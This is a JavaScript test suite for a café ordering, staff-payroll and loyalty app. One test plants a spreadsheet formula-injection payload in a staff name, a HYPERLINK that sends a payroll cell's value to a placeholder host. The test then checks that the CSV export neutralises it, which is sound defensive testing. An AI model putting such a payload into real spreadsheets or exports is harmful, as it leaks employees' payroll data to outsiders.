  const anna = await login('SASU-1003', 'demo123');
  await lena('PATCH', '/api/admin/settings', { orders_paused: 1 });
  try {
    assert.equal((await client()('GET', '/api/status')).body.orders_paused, true);
    const r = await anna('POST', '/api/orders', { items: [{ id: itemByName('Espresso').id, qty: 1 }], pickup_at: nextOpen() });
    assert.equal(r.status, 503);
    assert.match(r.body.error, /pausiert/);
  } finally {
    await lena('PATCH', '/api/admin/settings', { orders_paused: 0 });
  }
  assert.equal((await anna('POST', '/api/orders', { items: [{ id: itemByName('Espresso').id, qty: 1 }], pickup_at: nextOpen() })).status, 201);
});

test('rush delay pushes the earliest pickup to 30 minutes', async () => {
  const lena = await login('SASU-1001', 'staff123');
  await lena('PATCH', '/api/admin/settings', { extra_delay_min: 15 });
  try {
    const status = (await client()('GET', '/api/status')).body;
    assert.equal(status.lead_minutes, 30);
    for (const s of (await client()('GET', '/api/pickup-availability')).body) {
      assert.equal(validatePickup(new Date(s.at), new Date(), 30), null);
    }
  } finally {
    await lena('PATCH', '/api/admin/settings', { extra_delay_min: 0 });
  }
  assert.equal((await client()('GET', '/api/status')).body.lead_minutes, 15);
});

test('staff look up a member by QR code / member ID', async () => {
  const lena = await login('SASU-1001', 'staff123');
  const anna = await login('SASU-1003', 'demo123');
  const placed = (await anna('POST', '/api/orders', { items: [{ id: itemByName('Croissant').id, qty: 1 }], pickup_at: nextOpen() })).body;
  assert.equal((await anna('GET', '/api/admin/members/SASU-1003')).status, 403);
  const r = await lena('GET', '/api/admin/members/sasu-1003');
  assert.equal(r.status, 200);
  assert.equal(r.body.name, 'Anna Schmidt');
  assert.equal(r.body.tier.name, 'Bronze');
  assert.equal(r.body.password_hash, undefined);
  assert.ok(r.body.orders.some((o) => o.id === placed.id && o.items[0].name === 'Croissant'));
  assert.ok(r.body.orders.every((o) => ['new', 'preparing', 'ready'].includes(o.status)));
  assert.equal((await lena('GET', '/api/admin/members/SASU-1001')).status, 404); // staff aren't members
  assert.equal((await lena('GET', '/api/admin/members/SASU-99999')).status, 404);
});

test('camera may be used by our own page for the QR scanner', async () => {
  assert.match((await fetch(base + '/')).headers.get('permissions-policy'), /camera=\(self\)/);
});

test('until the temporary password is changed, only the password change works', async () => {
  const admin = await login('SASU-1000', 'admin123');
  await admin('POST', '/api/admin/staff', { name: 'Neu Ling', email: 'neu@cafe-elsasu.de', password: 'Temporaer1', hourly_wage: 1300 });
  const neu = await login('neu@cafe-elsasu.de', 'Temporaer1');
  assert.equal((await neu('GET', '/api/me')).status, 200);
  for (const [m, path] of [['GET', '/api/admin/orders'], ['POST', '/api/admin/shifts/clock'], ['GET', '/api/admin/settings']]) {
    const r = await neu(m, path);
    assert.equal(r.status, 403, path);
    assert.match(r.body.error, /Passwort/);
  }
  assert.equal((await neu('POST', '/api/me/password', { current: 'Temporaer1', next: 'EigenesPasswort1' })).status, 200);
  assert.equal((await neu('GET', '/api/admin/orders')).status, 200);
});

// --- work time, payroll, rota ---------------------------------------------------------

test('the team has 7 staff accounts', () => {
  assert.equal(db.prepare("SELECT COUNT(*) n FROM users WHERE role = 'staff' AND email LIKE '%@cafe-elsasu.de' AND member_id <= 'SASU-1011'").get().n, 7);
});

test('breaks: start and end on your own open shift', async () => {
  const sara = await login('sara@cafe-elsasu.de', 'staff123');
  assert.equal((await sara('POST', '/api/admin/shifts/break')).status, 409); // not clocked in
  await sara('POST', '/api/admin/shifts/clock');
  assert.equal((await sara('POST', '/api/admin/shifts/break')).body.on_break, true);
  const w = (await sara('GET', '/api/admin/me/work')).body;
  assert.equal(w.current.on_break, true);
  assert.equal((await sara('POST', '/api/admin/shifts/break')).body.on_break, false);
  await sara('POST', '/api/admin/shifts/clock'); // clocking out also ends a running break
  assert.equal((await sara('GET', '/api/admin/me/work')).body.current, null);
});

test('clocking out ends a running break', async () => {
  const tim = await login('tim@cafe-elsasu.de', 'staff123');
  await tim('POST', '/api/admin/shifts/clock');
  await tim('POST', '/api/admin/shifts/break');
  await tim('POST', '/api/admin/shifts/clock');
  assert.equal(db.prepare('SELECT COUNT(*) n FROM shift_breaks WHERE end IS NULL').get().n, 0);
});

test('my work: stats, daily totals, history with breaks and pay, handled orders', async () => {
  const elif = await login('elif@cafe-elsasu.de', 'staff123');
  const anna = await login('SASU-1003', 'demo123');
  const o = (await anna('POST', '/api/orders', { items: [{ id: itemByName('Croissant').id, qty: 1 }], pickup_at: nextOpen() })).body;
  await elif('PATCH', `/api/admin/orders/${o.id}`, { status: 'preparing' });
  const w = (await elif('GET', '/api/admin/me/work')).body;
  assert.equal(w.daily.length, 14);
  assert.ok(w.stats.month_hours > 0 && w.stats.month_pay_cents > 0);
  assert.ok(w.stats.orders_week >= 1);
  const s = w.shifts.find((x) => x.clock_out && x.break_minutes > 0);
  assert.ok(s, 'seeded shifts have breaks');
  const wage = db.prepare("SELECT hourly_wage FROM users WHERE email = 'elif@cafe-elsasu.de'").get().hourly_wage;
  assert.equal(s.pay_cents, Math.round((s.net_minutes / 60) * wage));
  assert.ok(Array.isArray(w.upcoming));
  const anon = await login('SASU-1003', 'demo123');
  assert.equal((await anon('GET', '/api/admin/me/work')).status, 403);
});

test('payroll CSV: one row per shift, totals, owner only', async () => {
  const admin = await login('SASU-1000', 'admin123');
  const lena = await login('SASU-1001', 'staff123');
  const month = new Date().toISOString().slice(0, 7);
  assert.equal((await lena('GET', `/api/admin/payroll.csv?month=${month}`)).status, 403);
  assert.equal((await admin('GET', '/api/admin/payroll.csv?month=2026-13')).status, 400);
  const res = await fetch(`${base}/api/admin/payroll.csv?month=${month}`, { headers: { cookie: await cookieOf(admin) } });
  assert.equal(res.status, 200);
  assert.match(res.headers.get('content-type'), /text\/csv/);
  assert.match(res.headers.get('content-disposition'), new RegExp(`lohn-${month}\\.csv`));
  const text = await res.text();
  const lines = text.replace(/^\uFEFF/, '').trim().split('\r\n');
  assert.equal(lines[0], 'Name;Mitgliedsnr;Datum;Beginn;Ende;Pause (min);Netto-Stunden;Stundenlohn;Lohn');
  assert.ok(lines.some((l) => l.startsWith('Lena Becker;SASU-1001;')));
  assert.ok(lines.some((l) => l.startsWith('Summe Lena Becker;')));
  assert.ok(lines.every((l) => l.split(';').length === 9));
});

test('rota: owner plans shifts, staff can read, overlaps refused', async () => {
  const admin = await login('SASU-1000', 'admin123');
  const lena = await login('SASU-1001', 'staff123');
  const paul = db.prepare("SELECT id FROM users WHERE email = 'paul@cafe-elsasu.de'").get().id;
  const day = new Date(Date.now() + 20 * 864e5).toISOString().slice(0, 10);
  const shift = { user_id: paul, start: `${day}T08:00:00.000Z`, end: `${day}T16:00:00.000Z`, note: 'Frühschicht' };
  assert.equal((await lena('POST', '/api/admin/rota', shift)).status, 403);
  const r = await admin('POST', '/api/admin/rota', shift);
  assert.equal(r.status, 201);
  assert.equal((await admin('POST', '/api/admin/rota', { ...shift, start: `${day}T15:00:00.000Z`, end: `${day}T20:00:00.000Z` })).status, 409);
  for (const bad of [{ ...shift, end: shift.start }, { ...shift, end: `${day}T23:30:00.000Z`, start: `${day}T06:00:00.000Z` }, { ...shift, user_id: 4 }, { ...shift, start: 'gestern' }]) {
    assert.equal((await admin('POST', '/api/admin/rota', bad)).status, 400, JSON.stringify(bad));
  }
  const week = (await lena('GET', `/api/admin/rota?from=${day}&days=7`)).body;
  assert.ok(week.some((p) => p.id === r.body.id && p.name === 'Paul Richter'));
  assert.equal((await admin('GET', '/api/admin/rota?from=gestern&days=7')).status, 400);
  assert.equal((await lena('DELETE', `/api/admin/rota/${r.body.id}`)).status, 403);
  assert.equal((await admin('DELETE', `/api/admin/rota/${r.body.id}`)).status, 200);
  assert.equal((await admin('DELETE', `/api/admin/rota/${r.body.id}`)).status, 404);
});

test('the rota is seeded for the next two weeks', () => {
  assert.ok(db.prepare('SELECT COUNT(*) n FROM planned_shifts WHERE start >= ?').get(new Date().toISOString()).n >= 10);
});

// --- payroll CSV hardening --------------------------------------------------------------

async function payrollCsv(admin) {
  const month = new Date().toISOString().slice(0, 7);
  const res = await fetch(`${base}/api/admin/payroll.csv?month=${month}`, { headers: { cookie: await cookieOf(admin) } });
  return (await res.text()).replace(/^\uFEFF/, '').trim().split('\r\n');
}
function staffWithShift(name, email, wage) {
  const id = db.prepare(`INSERT INTO users (member_id, name, email, password_hash, role, hourly_wage) VALUES (?, ?, ?, 'x:x', 'staff', ?)`)
    .run(`SASU-${8000 + Math.floor(Math.random() * 999)}`, name, email, wage).lastInsertRowid;
  const start = new Date(Date.now() - 864e5); start.setUTCHours(8, 0, 0, 0);
  db.prepare('INSERT INTO shifts (user_id, clock_in, clock_out) VALUES (?, ?, ?)').run(id, start.toISOString(), new Date(start.getTime() + 4 * 3600e3).toISOString());
  return id;
}

test('payroll CSV neutralises spreadsheet formulas in names', async () => {
  const admin = await login('SASU-1000', 'admin123');
  staffWithShift('=HYPERLINK("http://x/?"&C2;"Lohn")', 'formel@cafe-elsasu.de', 1200);
  staffWithShift('+49 Plus', 'plus@cafe-elsasu.de', 1200);
  const cells = (await payrollCsv(admin)).flatMap((l) => l.match(/("([^"]|"")*"|[^;]*)(;|$)/g).map((c) => c.replace(/;$/, '').replace(/^"|"$/g, '')));
  assert.ok(cells.some((c) => c.includes('HYPERLINK')), 'the row is there');
  for (const c of cells) assert.ok(!/^[=+\-@]/.test(c), `cell starts with a formula character: ${c}`);
});

test('payroll CSV keeps two people with the same name apart', async () => {
  const admin = await login('SASU-1000', 'admin123');
  staffWithShift('Doppel Name', 'doppel1@cafe-elsasu.de', 1000);
  staffWithShift('Doppel Name', 'doppel2@cafe-elsasu.de', 2000);
  const sums = (await payrollCsv(admin)).filter((l) => l.startsWith('Summe Doppel Name;'));
  assert.equal(sums.length, 2);
  assert.deepEqual(sums.map((l) => l.split(';')[8]).sort(), ['40,00', '80,00']);
});

// --- guest experience ---------------------------------------------------------------

async function newGuest(tag) {
  const c = client();
  const r = await c('POST', '/api/register', { name: `Gast ${tag}`, email: `${tag}@example.com`, password: 'kaffee1234' });
  assert.equal(r.status, 201);
  return c;
}

test('Das Übliche: most-ordered exact combination and usual pickup time', async () => {
  const c = await newGuest('usual');
  const flat = await menuItem('Flat White');
  const oat = optionId(flat, 'Hafermilch');
  const shot = optionId(flat, 'Extra Shot');
  assert.equal((await c('GET', '/api/me/usual')).body, null); // nothing ordered yet
  for (const items of [[{ id: flat.id, qty: 1, mods: [shot, oat] }], [{ id: flat.id, qty: 1, mods: [oat, shot] }], [{ id: itemByName('Espresso').id, qty: 1 }]]) {
    assert.equal((await c('POST', '/api/orders', { items, pickup_at: quietSlot() })).status, 201);
  }
  const u = (await c('GET', '/api/me/usual')).body;
  assert.equal(u.item.name, 'Flat White');
  assert.deepEqual(u.mods.map((m) => m.name), ['Hafermilch', 'Extra Shot']);
  assert.equal(u.unit_price_cents, flat.price_cents + 50 + 80);
  assert.match(u.usual_time, /^\d\d:\d\d$/);
});

test('favorites: save a combination once, list, delete; only your own', async () => {
  const c = await newGuest('fav');
  const other = await newGuest('fav2');
  const flat = await menuItem('Flat White');
  const fav = { menu_item_id: flat.id, mods: [optionId(flat, 'Mandelmilch'), optionId(flat, 'Vanille')] };
  const a = await c('POST', '/api/me/favorites', fav);
  assert.equal(a.status, 201);
  assert.equal((await c('POST', '/api/me/favorites', { ...fav, mods: [...fav.mods].reverse() })).body.id, a.body.id); // same combo
  assert.equal((await c('POST', '/api/me/favorites', { menu_item_id: flat.id, mods: [999999] })).status, 400);
  const list = (await c('GET', '/api/me/favorites')).body;
  assert.equal(list.length, 1);
  assert.deepEqual(list[0].mods.map((m) => m.name), ['Mandelmilch', 'Vanille']);
  assert.equal(list[0].unit_price_cents, flat.price_cents + 50 + 40);
  assert.equal((await other('DELETE', `/api/me/favorites/${a.body.id}`)).status, 404);
  assert.equal((await c('DELETE', `/api/me/favorites/${a.body.id}`)).status, 200);
  assert.deepEqual((await c('GET', '/api/me/favorites')).body, []);
  const lena = await login('SASU-1001', 'staff123');
  assert.equal((await lena('GET', '/api/me/favorites')).status, 403);
});

test('preferences: preferred milk and vegan-only are validated and returned', async () => {
  const c = await newGuest('pref');
  const r = await c('PATCH', '/api/me', { preferences: { milk: 'Hafermilch', vegan_only: true } });
  assert.equal(r.status, 200);
  assert.deepEqual(r.body.preferences, { milk: 'Hafermilch', vegan_only: true });
  assert.deepEqual((await c('GET', '/api/me')).body.preferences, { milk: 'Hafermilch', vegan_only: true });
  for (const bad of [{ milk: 'Kuhmilch', vegan_only: false }, { milk: null, vegan_only: 'ja' }, { milk: null, vegan_only: false, extra: 1 }, 'x']) {
    assert.equal((await c('PATCH', '/api/me', { preferences: bad })).status, 400, JSON.stringify(bad));
  }
  assert.deepEqual((await c('PATCH', '/api/me', { preferences: { milk: null, vegan_only: false } })).body.preferences, { milk: null, vegan_only: false });
});

const tomorrow = () => new Date(Date.now() + 864e5).toISOString().slice(0, 10);

test('bean subscription: reserve, skip, pause, resume, cancel', async () => {
  const c = await newGuest('beans');
  for (const bad of [{ bean: 'robusta', size: '250g', every_weeks: 2, first_pickup: tomorrow() }, { bean: 'espresso', size: '500g', every_weeks: 2, first_pickup: tomorrow() },
    { bean: 'espresso', size: '250g', every_weeks: 3, first_pickup: tomorrow() }, { bean: 'espresso', size: '250g', every_weeks: 2, first_pickup: '2020-01-01' }]) {
    assert.equal((await c('POST', '/api/me/beans', bad)).status, 400, JSON.stringify(bad));
  }
  const r = await c('POST', '/api/me/beans', { bean: 'espresso', size: '250g', every_weeks: 2, first_pickup: tomorrow() });
  assert.equal(r.status, 201);
  assert.equal(r.body.price_cents, 890);
  assert.equal(r.body.next_pickup, tomorrow());
  const id = r.body.id;
  const skip = await c('PATCH', `/api/me/beans/${id}`, { action: 'skip' });
  assert.equal(skip.body.next_pickup, new Date(Date.parse(tomorrow()) + 14 * 864e5).toISOString().slice(0, 10));
  assert.equal((await c('PATCH', `/api/me/beans/${id}`, { action: 'pause' })).body.status, 'paused');
  assert.equal((await c('PATCH', `/api/me/beans/${id}`, { action: 'resume' })).body.status, 'active');
  assert.equal((await c('PATCH', `/api/me/beans/${id}`, { action: 'explode' })).status, 400);
  assert.equal((await (await newGuest('beans2'))('PATCH', `/api/me/beans/${id}`, { action: 'pause' })).status, 404);
  assert.equal((await c('GET', '/api/me/beans')).body.length, 1);
  assert.equal((await c('PATCH', `/api/me/beans/${id}`, { action: 'cancel' })).body.status, 'cancelled');
  assert.equal((await c('PATCH', `/api/me/beans/${id}`, { action: 'resume' })).status, 409);
});

test('staff see due bean bags and mark them handed out', async () => {
  const c = await newGuest('beans3');
  const lena = await login('SASU-1001', 'staff123');
  const sub = (await c('POST', '/api/me/beans', { bean: 'decaf', size: '1kg', every_weeks: 4, first_pickup: tomorrow() })).body;
  assert.equal((await c('GET', '/api/admin/beans?days=7')).status, 403);
  const due = (await lena('GET', '/api/admin/beans?days=7')).body;
  const row = due.find((d) => d.id === sub.id);
  assert.ok(row && row.name === 'Gast beans3' && row.price_cents === 3190);
  const handed = await lena('POST', `/api/admin/beans/${sub.id}/handed`);
  assert.equal(handed.body.next_pickup, new Date(Date.parse(tomorrow()) + 28 * 864e5).toISOString().slice(0, 10));
  assert.ok(!(await lena('GET', '/api/admin/beans?days=7')).body.some((d) => d.id === sub.id));
});

test('gift paid with points: link works once, for someone else, inside an order', async () => {
  const sender = await newGuest('giver');
  const friend = await newGuest('friend');
  const senderId = db.prepare("SELECT id FROM users WHERE email = 'giver@example.com'").get().id;
  assert.equal((await sender('POST', '/api/gifts', { recipient_name: 'Ali', message: 'Danke!', pay: 'points' })).status, 400); // 0 points
  db.prepare('UPDATE users SET points = 150 WHERE id = ?').run(senderId);
  const g = await sender('POST', '/api/gifts', { recipient_name: 'Ali', message: 'Danke für alles!', pay: 'points' });
  assert.equal(g.status, 201);
  assert.equal(g.body.status, 'active');
  assert.match(g.body.code, /^G-[A-Z0-9]{8}$/);
  assert.equal(db.prepare('SELECT points FROM users WHERE id = ?').get(senderId).points, 50);
  const pub = (await client()('GET', `/api/gifts/${g.body.code}`)).body;
  assert.deepEqual(Object.keys(pub).sort(), ['from', 'message', 'recipient_name', 'status']);
  assert.equal(pub.from, 'Gast');
  assert.equal((await client()('GET', '/api/gifts/G-NOPE0000')).status, 404);
  assert.equal((await client()('GET', `/api/gifts/${g.body.code}/qr`)).status, 200);
  const espresso = itemByName('Espresso').id;
  const own = await sender('POST', '/api/orders', { items: [{ id: espresso, qty: 1 }], pickup_at: quietSlot(), gift_code: g.body.code });
  assert.equal(own.status, 400); // not your own gift
  const reward = db.prepare("SELECT id FROM rewards WHERE category_allowed = 'pastry'").get().id;
  assert.equal((await friend('POST', '/api/orders', { items: [{ id: espresso, qty: 1 }], pickup_at: quietSlot(), gift_code: g.body.code, reward_id: reward })).status, 400);
  assert.equal((await friend('POST', '/api/orders', { items: [{ id: itemByName('Croissant').id, qty: 1 }], pickup_at: quietSlot(), gift_code: g.body.code })).status, 400); // no coffee
  const used = await friend('POST', '/api/orders', { items: [{ id: espresso, qty: 1 }, { id: itemByName('Croissant').id, qty: 1 }], pickup_at: quietSlot(), gift_code: g.body.code });
  assert.equal(used.status, 201);
  assert.equal(used.body.total_cents, itemByName('Croissant').price_cents);
  assert.equal((await client()('GET', `/api/gifts/${g.body.code}`)).body.status, 'redeemed');
  assert.equal((await friend('POST', '/api/orders', { items: [{ id: espresso, qty: 1 }], pickup_at: quietSlot(), gift_code: g.body.code })).status, 400);
  assert.equal((await sender('POST', `/api/gifts/${g.body.code}/cancel`)).status, 409);
  // cancelling the order gives the gift back
  await friend('POST', `/api/orders/${used.body.id}/cancel`);
  assert.equal((await client()('GET', `/api/gifts/${g.body.code}`)).body.status, 'active');
  assert.ok((await sender('GET', '/api/me/gifts')).body.some((x) => x.code === g.body.code));
});

test('gift paid at the counter: pending until staff activate it; cancel refunds points gifts', async () => {
  const sender = await newGuest('counter');
  const lena = await login('SASU-1001', 'staff123');
  const g = (await sender('POST', '/api/gifts', { recipient_name: 'Mo', message: '', pay: 'counter' })).body;
  assert.equal(g.status, 'pending');
  assert.equal(g.price_cents, 500);
  const friend = await newGuest('counterfriend');
  assert.equal((await friend('POST', '/api/orders', { items: [{ id: itemByName('Espresso').id, qty: 1 }], pickup_at: quietSlot(), gift_code: g.code })).status, 400);
  assert.equal((await sender('POST', `/api/admin/gifts/${g.code}/activate`)).status, 403);
  assert.equal((await lena('GET', `/api/admin/gifts/${g.code}`)).body.status, 'pending');
  assert.equal((await lena('POST', `/api/admin/gifts/${g.code}/activate`)).body.status, 'active');
  assert.equal((await lena('POST', `/api/admin/gifts/${g.code}/activate`)).status, 409);
  // a points gift cancelled before use refunds the points
  const id = db.prepare("SELECT id FROM users WHERE email = 'counter@example.com'").get().id;
  db.prepare('UPDATE users SET points = 100 WHERE id = ?').run(id);
  const p = (await sender('POST', '/api/gifts', { recipient_name: 'Zoe', message: '', pay: 'points' })).body;
  assert.equal((await sender('POST', `/api/gifts/${p.code}/cancel`)).body.status, 'cancelled');
  assert.equal(db.prepare('SELECT points FROM users WHERE id = ?').get(id).points, 100);
});

function pickedUpOrder(email) {
  const uid = db.prepare('SELECT id FROM users WHERE email = ?').get(email).id;
  const o = db.prepare(`INSERT INTO orders (user_id, pickup_at, status, subtotal_cents, discount_cents, total_cents) VALUES (?, ?, 'picked_up', 300, 0, 300)`)
    .run(uid, new Date(Date.now() - 40 * 864e5).toISOString()).lastInsertRowid;
  db.prepare('INSERT INTO order_items (order_id, menu_item_id, qty, unit_price_cents) VALUES (?, ?, 1, 300)').run(o, itemByName('Croissant').id);
}
const dayFromNow = (d) => new Date(Date.now() + d * 864e5).toISOString().slice(0, 10);

test('every member gets the birthday treat during their birthday week', async () => {
  const c = await newGuest('bday');
  pickedUpOrder('bday@example.com');
  // a birthday entered long ago (set directly, like an older account)
  db.prepare("UPDATE users SET birthday = ?, birthday_changed_at = ? WHERE email = 'bday@example.com'").run('1990' + dayFromNow(2).slice(4), new Date(Date.now() - 90 * 864e5).toISOString());
  assert.ok((await c('GET', '/api/rewards')).body.some((r) => r.birthday_only));
  assert.equal((await c('GET', '/api/me')).body.birthday_week, true);
  db.prepare("UPDATE users SET birthday = ? WHERE email = 'bday@example.com'").run('1990' + dayFromNow(20).slice(4));
  assert.ok(!(await c('GET', '/api/rewards')).body.some((r) => r.birthday_only));
});

test('no birthday treat for brand-new accounts or a freshly changed birthday', async () => {
  // throwaway account: registered today with today's birthday, never picked anything up
  const fresh = client();
  await fresh('POST', '/api/register', { name: 'Neu', email: 'farm1@example.com', password: 'kaffee1234', birthday: '1990' + dayFromNow(0).slice(4) });
  assert.ok(!(await fresh('GET', '/api/rewards')).body.some((r) => r.birthday_only));
  // even with a picked-up order: a birthday entered today doesn't count for 30 days
  pickedUpOrder('farm1@example.com');
  assert.ok(!(await fresh('GET', '/api/rewards')).body.some((r) => r.birthday_only));
  // an established member who edits the birthday to today doesn't get it either
  const c = await newGuest('farm2');
  pickedUpOrder('farm2@example.com');
  await c('PATCH', '/api/me', { birthday: '1990' + dayFromNow(1).slice(4) });
  assert.ok(!(await c('GET', '/api/rewards')).body.some((r) => r.birthday_only));
});


// --- vegan filter data --------------------------------------------------------------

test('only drinks without other dairy are marked "vegan with plant milk"', async () => {
  const menu = (await client()('GET', '/api/menu')).body;
  const tags = (name) => menu.find((i) => i.name === name).tags.split(',');
  for (const ok of ['Flat White', 'Cappuccino', 'Cortado', 'Chai Latte']) assert.ok(tags(ok).includes('plant'), ok);
  for (const no of ['Affogato', 'Irischer Kaffee', 'Wiener Melange', 'Eisschokolade', 'Spanish Latte', 'Heiße Schokolade', 'Cheesecake']) {
    assert.ok(!tags(no).includes('plant') && !tags(no).includes('vegan'), no);
  }
});

test('owner can set the plant-milk tag', async () => {
  const admin = await login('SASU-1000', 'admin123');
  const id = itemByName('Mokka Kaffee').id;
  assert.equal((await admin('PATCH', `/api/admin/menu/${id}`, { tags: 'lactose,plant' })).status, 200);
});

// --- usernames ------------------------------------------------------------------------

test('every account gets a vorname.nachname#### username and can log in with it', async () => {
  const a = client();
  const r = await a('POST', '/api/register', { name: 'Gast Uname', email: 'uname1@example.com', password: 'kaffee1234' });
  assert.match(r.body.username, /^gast\.uname\d{4}$/);
  const b = client();
  const r2 = await b('POST', '/api/register', { name: 'Gast Uname', email: 'uname2@example.com', password: 'kaffee1234' });
  assert.notEqual(r2.body.username, r.body.username);
  assert.equal((await client()('POST', '/api/login', { id: r.body.username.toUpperCase(), password: 'kaffee1234' })).status, 200);
  const admin = await login('SASU-1000', 'admin123');
  const staff = await admin('POST', '/api/admin/staff', { name: 'Ömer Çelik', email: 'oemer@cafe-elsasu.de', password: 'Temporaer1', hourly_wage: 1300 });
  assert.match(staff.body.username, /^oemer\.celik\d{4}$/);
  const adminName = db.prepare("SELECT username FROM users WHERE member_id = 'SASU-1000'").get().username;
  assert.equal((await client()('POST', '/api/login', { id: adminName, password: 'admin123' })).status, 200);
});

// --- bean sales & analytics -------------------------------------------------------------

test('handing out a bean bag records a sale', async () => {
  const c = await newGuest('beansale');
  const lena = await login('SASU-1001', 'staff123');
  const sub = (await c('POST', '/api/me/beans', { bean: 'espresso', size: '1kg', every_weeks: 2, first_pickup: tomorrow() })).body;
  const before = db.prepare('SELECT COUNT(*) n FROM bean_sales').get().n;
  await lena('POST', `/api/admin/beans/${sub.id}/handed`);
  const sale = db.prepare('SELECT * FROM bean_sales ORDER BY id DESC').get();
  assert.equal(db.prepare('SELECT COUNT(*) n FROM bean_sales').get().n, before + 1);
  assert.equal(sale.price_cents, 2990);
  assert.equal(sale.subscription_id, sub.id);
});

test('analytics: owner only, valid ranges', async () => {
  const admin = await login('SASU-1000', 'admin123');
  const lena = await login('SASU-1001', 'staff123');
  assert.equal((await lena('GET', '/api/admin/analytics?range=week')).status, 403);
  for (const q of ['range=year', 'from=2026-10-10&to=2026-10-01', 'from=2025-01-01&to=2026-01-01', 'from=heute&to=morgen']) {
    assert.equal((await admin('GET', `/api/admin/analytics?${q}`)).status, 400, q);
  }
  const d = new Date(Date.now() - 3 * 864e5).toISOString().slice(0, 10);
  const r = await admin('GET', `/api/admin/analytics?from=${d}&to=${new Date().toISOString().slice(0, 10)}`);
  assert.equal(r.status, 200);
  assert.equal(r.body.timeline.length, 4);
});

test('analytics: numbers add up', async () => {
  const admin = await login('SASU-1000', 'admin123');
  const a = (await admin('GET', '/api/admin/analytics?range=month')).body;
  const k = a.kpi;
  const orderRevenue = db.prepare("SELECT COALESCE(SUM(total_cents), 0) s, COUNT(*) n FROM orders WHERE status = 'picked_up' AND pickup_at >= ? AND pickup_at < ?").get(a.range.from_utc, a.range.to_utc);
  const beans = db.prepare('SELECT COALESCE(SUM(price_cents), 0) s FROM bean_sales WHERE at >= ? AND at < ?').get(a.range.from_utc, a.range.to_utc).s;
  assert.equal(k.gross_cents, orderRevenue.s + beans);
  assert.equal(k.orders, orderRevenue.n);
  assert.equal(k.net_cents, k.gross_cents - k.labor_cents);
  assert.ok(Math.abs(k.labor_ratio - k.labor_cents / k.gross_cents) < 1e-9);
  assert.equal(k.avg_ticket_cents, Math.round(orderRevenue.s / orderRevenue.n));
  assert.ok(k.labor_cents > 0 && k.discounts_cents >= 0);
  assert.equal(a.timeline.reduce((s, d) => s + d.revenue_cents, 0), k.gross_cents);
  assert.equal(a.timeline.reduce((s, d) => s + d.labor_cents, 0), k.labor_cents);
  assert.deepEqual(a.hours.map((h) => h.hour), [9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19]);
  assert.deepEqual(a.categories.map((c) => c.label), ['Kaffee', 'Kaltgetränke', 'Kuchen', 'Gebäck', 'Kaffeebohnen']);
  assert.ok(Math.abs(a.categories.reduce((s, c) => s + c.share, 0) - 1) < 1e-9);
  assert.ok(a.top_items.length <= 10 && a.top_items.every((x, i, l) => i === 0 || l[i - 1].revenue_cents >= x.revenue_cents));
  assert.ok(a.slow_items.length <= 5 && a.slow_items.every((x, i, l) => i === 0 || l[i - 1].qty <= x.qty));
  assert.equal(a.channels.online + a.channels.walkin, k.orders);
  assert.equal(a.vat.reduced.gross + a.vat.standard.gross, k.gross_cents);
  assert.ok(Array.isArray(a.modifiers) && a.insights.length >= 3);
});

test('report CSV for the same range', async () => {
  const admin = await login('SASU-1000', 'admin123');
  const lena = await login('SASU-1001', 'staff123');
  assert.equal((await lena('GET', '/api/admin/report.csv?range=week')).status, 403);
  const res = await fetch(`${base}/api/admin/report.csv?range=week`, { headers: { cookie: await cookieOf(admin) } });
  assert.equal(res.status, 200);
  assert.match(res.headers.get('content-disposition'), /bericht-.*\.csv/);
  const lines = (await res.text()).replace(/^\uFEFF/, '').trim().split('\r\n');
  for (const label of ['Brutto-Umsatz', 'Netto-Umsatz', 'MwSt 7 %', 'MwSt 19 %', 'Personalkosten', 'Ergebnis', 'Bestellungen']) {
    assert.ok(lines.some((l) => l.startsWith(label + ';')), label);
  }
  assert.ok(lines.includes('Datum;Umsatz;Personalkosten;Ergebnis;Bestellungen'));
});
